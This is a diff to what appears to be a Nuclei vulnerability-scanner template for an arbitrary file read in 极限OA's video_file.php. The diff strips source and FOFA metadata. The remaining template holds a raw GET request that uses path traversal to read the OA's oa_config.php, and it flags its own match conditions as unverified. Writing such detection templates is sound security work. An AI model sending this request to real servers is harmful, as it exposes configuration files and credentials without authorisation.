@@ -3,14 +3,8 @@ info:
   name: 极限OAvideo_file.php任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/2cfe2b36fc76353ee08af25a75f51fd8
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 2cfe2b36fc76353ee08af25a75f51fd8
-    fofa: + huter`web.icon=="d8028456021988373d7eca8b7ec28f09"`
 http:
 - raw:
   - 'GET /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php HTTP/1.1
